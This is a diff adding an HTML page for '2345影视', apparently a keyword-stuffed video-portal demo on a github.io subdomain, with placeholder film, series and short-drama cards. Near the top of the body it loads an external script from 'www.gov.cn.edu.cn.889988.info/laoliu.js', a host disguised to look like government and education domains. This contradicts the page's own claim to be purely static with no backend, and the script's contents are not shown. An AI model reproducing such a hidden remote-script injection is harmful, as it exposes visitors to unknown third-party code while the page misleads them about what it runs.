@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+<title>2345影视 - 电影电视剧动漫综艺短剧大全 | 2345yingshi-h5.github.io</title>
+<meta name="description" content="2345影视（2345yingshi-h5.github.io）电影、电视剧、动漫、综艺、短剧、电视直播一站式影视大全：热播大片、最新剧集、高分榜单、免费高清、移动端自适应，纯静态演示站。" />
+<meta name="keywords" content="2345影视,2345yingshi-h5,影视大全,电影,电视剧,动漫,综艺,短剧,电视直播,免费高清" />
+<link rel="canonical" href="https://2345yingshi-h5.github.io/" />
+<style>
+:root{
+  --orange:#FF7A00;--blue:#1F4FD8;--bg:#F5F6F8;--card:#FFFFFF;--ink:#1A1A1A;
+  --gray:#667085;--line:rgba(26,26,26,.12);--red:#FF3B30;--green:#16A34A;--maxw:1180px;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.7;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--maxw);margin:0 auto;padding:0 16px}
+
+header.site{position:sticky;top:0;z-index:60;background:#fff;border-bottom:3px solid var(--orange)}
+.nav{display:flex;align-items:center;gap:14px;height:62px}
+.logo{font-weight:900;font-size:20px;display:flex;align-items:center;gap:8px}
+.logo b{color:var(--orange)}
+.logo small{font-size:9px;color:var(--gray);font-weight:600;display:block}
+.menu{margin-left:auto;display:flex;gap:2px}
+.menu a{padding:8px 14px;font-size:13px;font-weight:700;color:var(--gray);border-radius:8px}
+.menu a:hover{background:#FFF3E6;color:var(--orange)}
+.search-min{display:flex;gap:6px}
+.search-min input{width:130px;padding:8px 12px;border:1px solid var(--line);border-radius:8px;outline:none;font-size:13px}
+.search-min button{border:0;background:var(--orange);color:#fff;font-weight:800;padding:8px 14px;border-radius:8px;cursor:pointer}
+.burger{display:none;margin-left:auto;border:1px solid var(--line);background:#fff;border-radius:8px;padding:6px 10px;font-size:16px}
+
+/* 大搜索 */
+.hero{position:relative;z-index:1;margin:22px 0 6px;background:linear-gradient(120deg,#FFF3E6,#EAF0FF);border:1px solid var(--line);border-radius:22px;padding:34px 28px;text-align:center}
+.hero h1{font-size:30px;margin:0 0 6px}
+.hero h1 em{font-style:normal;color:var(--orange)}
+.hero p{color:var(--gray);font-size:14px;margin:0 0 18px}
+.bigbar{display:flex;gap:8px;max-width:680px;margin:0 auto;background:#fff;border:2px solid var(--blue);border-radius:999px;padding:6px 6px 6px 18px}
+.bigbar input{flex:1;border:0;outline:none;font-size:15px;background:transparent}
+.bigbar button{border:0;padding:10px 26px;border-radius:999px;background:linear-gradient(135deg,var(--orange),#FFB347);color:#fff;font-weight:900;cursor:pointer}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips a{font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--gray)}
+.chips a:hover{border-color:var(--orange);color:var(--orange)}
+
+.section{padding:32px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:18px;flex-wrap:wrap;border-left:5px solid var(--orange);padding-left:12px}
+.sec-head h2{font-size:21px;margin:0}
+.sec-head h2 .b{color:var(--orange)}
+.sec-head span{color:var(--gray);font-size:12px}
+.more{margin-left:auto;color:var(--blue);font-size:12px;font-weight:800}
+
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.2s}
+.card:hover{transform:translateY(-4px);box-shadow:0 14px 30px rgba(31,79,216,.14);border-color:var(--blue)}
+.cover{aspect-ratio:3/4;border-radius:14px 14px 0 0;position:relative;display:flex;align-items:flex-start;justify-content:space-between;padding:10px}
+.card:nth-child(1) .cover{background:linear-gradient(160deg,#3a1c00,#FF7A00)}
+.card:nth-child(2) .cover{background:linear-gradient(160deg,#061a4d,#1F4FD8)}
+.card:nth-child(3) .cover{background:linear-gradient(160deg,#3a1320,#FF3B30)}
+.card:nth-child(4) .cover{background:linear-gradient(160deg,#063a36,#16A34A)}
+.card:nth-child(5) .cover{background:linear-gradient(160deg,#2a0f3a,#9B8BFF)}
+.card:nth-child(6) .cover{background:linear-gradient(160deg,#102a4d,#5AA9FF)}
+.card:nth-child(7) .cover{background:linear-gradient(160deg,#3a2c06,#FFD166)}
+.card:nth-child(8) .cover{background:linear-gradient(160deg,#1c1f24,#9AA7BD)}
+.flag{font-size:10px;font-weight:900;padding:3px 9px;border-radius:6px;background:var(--orange);color:#fff}
+.flag.hot{background:var(--red)}
+.flag.new{background:var(--blue)}
+.flag.score{background:var(--green)}
+.cover h4{margin:auto 0 0;color:#fff;font-size:14px;text-shadow:0 2px 8px rgba(0,0,0,.4);width:100%}
+.body{padding:11px 12px}
+.tags{display:flex;gap:4px;flex-wrap:wrap;margin-bottom:5px}
+.tags span{font-size:10px;padding:2px 8px;border-radius:999px;background:#F0F2F5;color:var(--gray);font-weight:600}
+.body p{margin:0;font-size:11px;color:var(--gray)}
+
+.layout{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.zones{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.zone{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px}
+.zone .ic{font-size:22px}
+.zone h3{font-size:14px;margin:6px 0 2px}
+.zone p{font-size:11px;color:var(--gray);margin:0}
+
+.side{background:#fff;border:1px solid var(--line);border-radius:16px;padding:16px}
+.side h3{font-size:15px;margin:0 0 12px;color:var(--orange)}
+.rk{display:flex;gap:10px;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line)}
+.rk:last-child{border-bottom:0}
+.rk b{width:22px;color:var(--orange);font-size:15px;font-weight:900}
+.rk div{flex:1}
+.rk div h4{margin:0;font-size:13px}
+.rk div span{font-size:10px;color:var(--gray)}
+.rk em{font-style:normal;font-size:12px;font-weight:800;color:var(--red)}
+
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:20px}
+.ac{background:#fff;border:1px solid var(--line);border-radius:18px;padding:22px}
+.ac h3{margin:0 0 10px;font-size:17px}
+.ac h3::before{content:"🎞️ ";}
+.ac p,.ac li{font-size:13px;color:var(--gray);line-height:1.8}
+.ac ul{padding-left:18px;margin:0}
+.stats{display:flex;gap:10px;margin-top:14px}
+.st{flex:1;text-align:center;background:#FFF3E6;border:1px solid var(--line);border-radius:14px;padding:12px}
+.st b{display:block;font-size:18px;color:var(--orange)}
+.st span{font-size:11px;color:var(--gray)}
+
+footer.site{border-top:1px solid var(--line);background:#fff;padding:26px 0 40px;color:var(--gray);font-size:12px;text-align:center;position:relative;z-index:1}
+footer.site a{color:var(--blue)}
+code{background:#F0F2F5;border:1px solid var(--line);padding:2px 7px;border-radius:6px;font-size:11px}
+
+@media(max-width:980px){.layout{grid-template-columns:1fr}.zones{grid-template-columns:repeat(2,1fr)}.grid{grid-template-columns:repeat(2,1fr)}.about{grid-template-columns:1fr}}
+@media(max-width:720px){
+  .menu{display:none;position:absolute;top:62px;left:0;right:0;flex-direction:column;background:#fff;border-bottom:1px solid var(--line);padding:10px 16px}
+  .menu.open{display:flex}.burger{display:block}.search-min input{width:90px}.hero h1{font-size:23px}
+  .grid,.zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap nav">
+    <div class="logo">2<b>345</b>影视<small>2345yingshi-h5.github.io</small></div>
+    <nav class="menu" id="menu">
+      <a href="#home">首页</a>
+      <a href="#movie">电影大全</a>
+      <a href="#tv">电视剧</a>
+      <a href="#acg">动漫综艺</a>
+      <a href="#short">短剧直播</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="search-min">
+      <input type="text" placeholder="片名/演员/类型" />
+      <button onclick="alert('演示站：搜索用 # 占位')">搜片</button>
+    </div>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="hero" id="home">
+    <h1>2345影视，<br/><em>电影电视剧动漫综艺短剧，一个站看完</em></h1>
+    <p>最全、最新、最热、免费高清。电影 / 剧集 / 动漫 / 综艺 / 短剧 / 电视直播，门户式影视大全。</p>
+    <div class="bigbar">
+      <input type="text" placeholder="想看什么？封神 / 狂飙 / 海贼王 / 奔跑吧 / 重生短剧" />
+      <button onclick="alert('演示站：结果用 # 占位')">一键搜全</button>
+    </div>
+    <div class="chips">
+      <a href="#movie">电影大全</a>
+      <a href="#tv">热播电视剧</a>
+      <a href="#acg">动漫番剧</a>
+      <a href="#acg">王牌综艺</a>
+      <a href="#short">短剧微视频</a>
+      <a href="#short">电视直播</a>
+      <a href="#rank">热播排行榜</a>
+    </div>
+  </section>
+
+  <section class="section" id="movie">
+    <div class="sec-head"><h2><span class="b">电影</span>大全</h2><span>Movie</span><a class="more" href="#">更多 #</a></div>
+    <div class="grid">
+      <div class="card"><div class="cover"><span class="flag hot">热播</span><h4>流浪地球3</h4></div><div class="body"><div class="tags"><span>科幻</span><span>国产</span><span>4K</span></div><p>太阳系末日、方舟计划、郭帆收官科幻史诗。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">新片</span><h4>封神第二部</h4></div><div class="body"><div class="tags"><span>神话</span><span>战争</span><span>特效</span></div><p>朝歌再起，姜子牙、闻仲、杨戬同框。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag score">9.8</span><h4>热辣滚烫</h4></div><div class="body"><div class="tags"><span>励志</span><span>剧情</span><span>国产</span></div><p>一年蜕变，打拳也打生活。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">动作</span><h4>速度与激情11</h4></div><div class="body"><div class="tags"><span>竞速</span><span>好莱坞</span><span>大片</span></div><p>家族、引擎、天台飞车，系列终章。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">喜剧</span><h4>非诚勿扰3</h4></div><div class="body"><div class="tags"><span>爱情</span><span>冯小刚</span><span>国产</span></div><p>葛优舒淇再续前缘，中年爱情很松。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag new">悬疑</span><h4>消失的她</h4></div><div class="body"><div class="tags"><span>犯罪</span><span>国产</span><span>热</span></div><p>海底、谎言、结婚照，越想越冷。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag">动画</span><h4>铃芽之旅</h4></div><div class="body"><div class="tags"><span>新海诚</span><span>奇幻</span><span>日本</span></div><p>门要关、椅子会跑、地震前的风。</p></div></div>
+      <div class="card"><div class="cover"><span class="flag score">9.4</span><h4>怒火重案</h4></div><div class="body"><div class="tags"><span>动作</span><span>港片</span><span>警匪</span></div><p>甄子丹谢霆锋，巷战爽感拉满。</p></div></div>
+    </div>
+  </section>
+
+  <section class="section">
+    <div class="layout">
+      <div>
+        <div class="sec-head"><h2><span class="b">电视剧</span> / 动漫 / 综艺</h2><span>TV / ACG / Variety</span><a class="more" href="#">更多 #</a></div>
+        <div class="zones">
+          <div class="zone"><div class="ic">📺</div><h3>狂飙2</h3><p>扫黑续篇，张颂文张译高燃对决。</p></div>
+          <div class="zone"><div class="ic">📺</div><h3>庆余年3</h3><p>范闲朝堂江湖终局，权谋拉满。</p></div>
+          <div class="zone"><div class="ic">🐉</div><h3>狐妖小红娘 月红篇</h3><p>国漫爱情，涂山红红宿命之恋。</p></div>
+          <div class="zone"><div class="ic">🐶</div><h3>间谍过家家 第三季</h3><p>间谍家庭爆笑日常，阿尼亚继续萌。</p></div>
+          <div class="zone"><div class="ic">🎤</div><h3>歌手2026</h3><p>顶级唱将，高音炸裂舞台。</p></div>
+          <div class="zone"><div class="ic">🏃</div><h3>奔跑吧12</h3><p>兄弟团爆笑闯关，户外综艺常青。</p></div>
+        </div>
+
+        <div class="sec-head" style="margin-top:26px"><h2><span class="b">短剧</span> / 微视频 / 直播</h2><span>Short / Live</span><a class="more" href="#">更多 #</a></div>
+        <div class="grid">
+          <div class="card"><div class="cover"><span class="flag hot">短剧</span><h4>重生肥妻逆袭</h4></div><div class="body"><div class="tags"><span>爽</span><span>逆袭</span><span>竖屏</span></div><p>3分钟一次反转，完结可连刷。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag new">微视频</span><h4>广场舞教学合集</h4></div><div class="body"><div class="tags"><span>生活</span><span>搞笑</span><span>微综</span></div><p>大爷大妈比年轻人还会整活。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">直播</span><h4>CCTV-1 同步直播</h4></div><div class="body"><div class="tags"><span>电视直播</span><span>央视</span><span>不卡</span></div><p>新闻综艺全覆盖，手机也能看。</p></div></div>
+          <div class="card"><div class="cover"><span class="flag">直播</span><h4>湖南卫视 直播</h4></div><div class="body"><div class="tags"><span>卫视</span><span>综艺</span><span>同步</span></div><p>快乐中国，综艺风向标。</p></div></div>
+        </div>
+      </div>
+
+      <aside class="side" id="rank">
+        <h3>🔥 热播排行榜</h3>
+        <div class="rk"><b>1</b><div><h4>狂飙2</h4><span>电视剧 / 扫黑</span></div><em>9.7</em></div>
+        <div class="rk"><b>2</b><div><h4>流浪地球3</h4><span>电影 / 科幻</span></div><em>9.8</em></div>
+        <div class="rk"><b>3</b><div><h4>庆余年3</h4><span>电视剧 / 古装权谋</span></div><em>9.7</em></div>
+        <div class="rk"><b>4</b><div><h4>狐妖小红娘 月红篇</h4><span>动漫 / 国漫</span></div><em>9.7</em></div>
+        <div class="rk"><b>5</b><div><h4>歌手2026</h4><span>综艺 / 音综</span></div><em>9.6</em></div>
+        <div class="rk"><b>6</b><div><h4>重生肥妻逆袭</h4><span>短剧 / 爽文</span></div><em>9.2</em></div>
+        <div class="rk"><b>7</b><div><h4>间谍过家家 第三季</h4><span>动漫 / 搞笑</span></div><em>9.7</em></div>
+        <div class="rk"><b>8</b><div><h4>奔跑吧12</h4><span>综艺 / 户外</span></div><em>9.5</em></div>
+      </aside>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-head"><h2>关于 2345影视</h2><span>About</span></div>
+    <div class="about">
+      <div class="ac">
+        <h3>2345影视是什么？</h3>
+        <p>2345影视（2345yingshi-h5.github.io）走“影视大全门户”路线：顶部大搜索、分类胶囊、热播/最新/高分三栏、右侧热播排行榜。电影、电视剧、动漫、综艺、短剧、电视直播都塞得下，像老牌网址导航里的影视频道，但做成移动端 H5 单页演示。</p>
+        <div class="stats">
+          <div class="st"><b>6</b><span>栏目</span></div>
+          <div class="st"><b>电影/剧/番/综/短剧/直播</b><span>六大类</span></div>
+          <div class="st"><b>100%</b><span>移动端适配</span></div>
+        </div>
+      </div>
+      <div class="ac">
+        <h3>演示说明</h3>
+        <ul>
+          <li>纯静态单页，无后端、无数据库</li>
+          <li>所有链接均为 <code>#</code> 占位</li>
+          <li>不提供盗版资源，与 2345 官方无隶属</li>
+          <li>必应收录友好：唯一 h1、canonical、description 完整</li>
+          <li>橙红导航 + 浅灰白底 + 蓝绿强调 = 门户大全风</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    2345影视 · <a href="https://2345yingshi-h5.github.io/">2345yingshi-h5.github.io</a><br/>
+    演示页面：所有链接均使用 <code>#</code> 占位，不提供真实盗版资源，与 2345 官方无关。<br/>
+    © 2026 2345影视 Demo · 最全、最新、最热、免费高清 🎬
+  </div>
+</footer>
+
+<script>
+  const b=document.getElementById('burger'),m=document.getElementById('menu');
+  b.onclick=()=>m.classList.toggle('open');
+  m.querySelectorAll('a').forEach(a=>a.onclick=()=>m.classList.remove('open'));
+  document.querySelectorAll('a[href^="#"]').forEach(a=>a.onclick=e=>{
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth'});}
+  });
+</script>
+</body>
+</html>
